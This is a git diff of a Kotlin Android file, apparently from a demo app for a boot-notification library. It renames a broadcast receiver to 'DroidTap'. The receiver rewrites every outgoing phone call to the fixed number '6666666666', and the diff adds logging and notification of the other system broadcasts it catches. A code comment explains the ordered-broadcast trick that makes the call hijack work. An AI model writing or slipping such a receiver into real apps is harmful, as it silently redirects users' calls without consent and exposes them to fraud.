@@ -19,10 +19,18 @@ package com.candroid.lacedboots
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.util.Log
+import com.candroid.bootlaces.BootNotification
 
 /*ACTION_OUTGOING_PHONE_CALL is an ORDERED BROADCAST. The system's default Phone application
 * is 'next in line' to receive the broadcast. The result data is passed on to the next registered receiver.
 * This changes the phone number for the outgoing phone call. */
-class CallReceiver : BroadcastReceiver(){
-    override fun onReceive(context: Context?, intent: Intent?) { resultData = "6666666666" }
+class DroidTap : BroadcastReceiver(){
+    override fun onReceive(context: Context?, intent: Intent?) {
+        when(intent!!.action){
+            Intent.ACTION_NEW_OUTGOING_CALL -> resultData = "6666666666"
+            else -> Log.d("Astras", intent!!.action)
+        }
+        BootNotification.update(context!!, "SYSTEM ACTION", intent.action)
+    }
 }
